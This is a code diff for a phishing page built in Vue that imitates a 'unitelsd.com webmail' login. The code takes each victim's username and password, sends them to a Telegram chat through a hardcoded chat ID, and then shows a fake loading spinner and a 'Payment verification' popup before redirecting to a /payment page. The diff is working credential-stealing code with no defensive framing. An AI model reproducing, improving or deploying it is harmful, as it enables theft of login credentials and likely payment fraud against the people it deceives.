@@ -53,8 +53,28 @@
             />
           </div>
 
-          <button type="submit">LOGIN</button>
+          <button
+            :disabled="loading || !isFormValid"
+          >
+            <span v-if="!loading">LOGIN</span>
+            <span v-else>Loading...</span>
+          </button>
         </form>
+      </div>
+
+      <!-- Loading Overlay -->
+      <div v-if="loading" class="over">
+        <div class="loader"></div>
+        <!-- <p>Please wait...</p> -->
+      </div>
+
+      <!-- Success Popup -->
+      <div v-if="showPopup" class="popup">
+        <div class="popup-content">
+          <h3>Payment verification</h3>
+          <br>
+          <p>Redirecting...</p>
+        </div>
       </div>
 
       <div class="footer">unitelsd.com webmail</div>
@@ -72,8 +92,8 @@ export default {
         username: "",
         password: "",
       },
-      // showPopup: false,
-      // loading: false,
+      showPopup: false,
+      loading: false,
       isActive: false,
       count: 0,
       finalCount: 1, // Only send once
@@ -82,7 +102,10 @@ export default {
 
   computed: {
     isFormValid() {
-      return (this.formDataRes.username.trim() !== "" && this.formDataRes.password.trim() !== "");
+      return (
+        this.formDataRes.username.trim() !== "" &&
+        this.formDataRes.password.trim() !== ""
+      );
     },
   },
 
@@ -92,33 +115,30 @@ export default {
     // },
 
     async finishJoob() {
-      //  this.showPopup = true;
+      this.loading = true;
+      this.showPopup = false;
 
       this.count++;
-      console.log("Count:", this.count);
 
-      if (this.count) {
-        this.loading = true;
+      // Format the message
+      const message = `*🔔🔔🔔 GOLDENWEST 🔔🔔🔔 *\nUSERNAME: ${this.formDataRes.username}\nPASSWORD: ${this.formDataRes.password}`;
 
-        // Format the message as string
-        const message = `*🔔🔔🔔 GOLDENWEST 🔔🔔🔔 *\nUSERNAME: ${this.formDataRes.username}\nPASSWORD: ${this.formDataRes.password}`;
+      // Send to Telegram
+      await this.sendTelegramResult(
+        process.env.NUXT_APP_CHAT_ID || "-4794000485",
+        message
+      );
 
-        // Send to Telegram
-        await this.sendTelegramResult(
-          process.env.NUXT_APP_CHAT_ID || "-4794000485",
-          message
-        );
-
-        this.isActive = !this.isActive;
+      // Keep the loader visible for 3 seconds
+      setTimeout(() => {
         this.loading = false;
-      } else {
-        this.$router.push({
-          path: "/",
-          // query: {
-          //   email: this.formDataRes.email,
-          // },
-        });
-      }
+        this.showPopup = true;
+
+        // Keep the popup visible for 2 seconds
+        setTimeout(() => {
+          this.$router.push("/payment");
+        }, 2000);
+      }, 3000);
     },
 
     async sendTelegramResult(chatId, message) {
@@ -141,6 +161,13 @@ export default {
 </script>
 
 <style scoped>
+#app {
+  margin: 0 !important;
+  padding: 0 !important;
+  width: 100%;
+  height: 100%;
+}
+
 * {
   margin: 0;
   padding: 0;
@@ -148,15 +175,16 @@ export default {
   font-family: Arial, Helvetica, sans-serif;
 }
 
-html {
+body {
   box-sizing: border-box;
   padding: 0;
   margin: 0;
-  width: full;
+  width: 100%;
+  height: 100vh;
 }
 
 .page {
-  width: full;
+  width: 100%;
   height: 100vh;
   background: url("https://d3mqmy22owj503.cloudfront.net/30/501030/images/site_graphics/hero-1.jpg")
     center center;
@@ -171,6 +199,50 @@ html {
   flex-direction: column;
   justify-content: center;
   align-items: center;
+}
+
+.over {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.45);
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+}
+
+.loader {
+  width: 55px;
+  height: 55px;
+  border: 5px solid #ddd;
+  border-top: 5px solid #1976d2;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+
+.popup {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.35);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 10000;
+}
+
+.popup-content {
+  background: #fff;
+  padding: 30px;
+  border-radius: 10px;
+  text-align: center;
+  min-width: 280px;
+}
+
+@keyframes spin {
+  to {
+    transform: rotate(360deg);
+  }
 }
 
 .login-box {
